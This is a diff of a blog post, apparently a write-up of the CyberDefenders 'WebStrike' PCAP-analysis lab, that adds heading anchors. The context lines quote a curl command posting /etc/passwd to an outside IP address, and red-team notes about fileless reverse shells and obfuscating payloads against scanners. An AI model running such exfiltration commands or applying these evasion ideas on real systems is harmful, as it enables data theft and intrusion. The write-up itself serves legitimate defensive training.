@@ -30,7 +30,7 @@ tags:
 - [Refining the Attack (Red Team)](#refining-the-attack)
 - [Try This Lab Yourself](#try-this-lab-yourself)
 
-# Overview / Goal
+# Overview / Goal {#overview--goal}
 
 This was my first time using **CyberDefenders.org**. I've had some experience on HackTheBox before, so I was tiny bit confident going in. The scenario sounded straightforward:
 
@@ -38,7 +38,7 @@ This was my first time using **CyberDefenders.org**. I've had some experience on
 >
 > Your task is to analyze the provided PCAP file to uncover how the file appeared and determine the extent of any unauthorised activity.
 
-# Lab Setup and Tools Used
+# Lab Setup and Tools Used {#lab-setup-and-tools-used}
 
 After waiting for the lab to load, I hit the **Open** button and saw a desktop with a folder called "Start here". Inside, two folders:
 
@@ -229,6 +229,6 @@ curl -X POST -d /etc/passwd http://117.11.88.124:443/
 - I would attempt to use a Fileless Reverse Shell directly in memory instead of mkfifo to make forensic recovery harder.
 - Obfuscate the payload to try to hide `system()` calls from basic scanners
 
-# Try This Lab Yourself
+# Try This Lab Yourself {#try-this-lab-yourself}
 
 🔗 Lab Link: [CyberDefenders: WebStrike](https://cyberdefenders.org/blueteam-ctf-challenges/webstrike/)
